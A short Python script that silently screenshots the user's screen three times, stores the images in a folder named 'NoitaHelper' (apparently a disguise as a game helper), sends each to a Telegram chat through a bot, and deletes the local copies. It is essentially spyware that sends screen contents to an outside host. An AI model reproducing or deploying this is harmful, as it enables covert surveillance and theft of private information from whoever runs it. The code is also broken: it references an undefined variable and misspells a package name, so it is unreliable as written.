# pip install puautogui telebot/pyTelegramBotAPI platform

import os
import pyautogui
import platform
import telebot

new_dir = os.path.expanduser("~/NoitaHelper")
os.makedirs(path, exist_ok=True)
path_s = os.path.join(new_dir, "new.png")

TOKEN = ""
CHAT_ID =  0
bot = telebot.TeleBot(TOKEN)

try:
  def make():
      screenshot = pyautogui.screenshot()
      screenshot.save(path_s)  
  def send():
      for i in range(3):
          make()
          with open(path_s, "rb") as s:
              bot.send_photo(CHAT_ID, s)
          os.remove(path_s)
  send()
except Exception as e:
  bot.send_message(CHAT_ID, f"Error: {str(e)}")
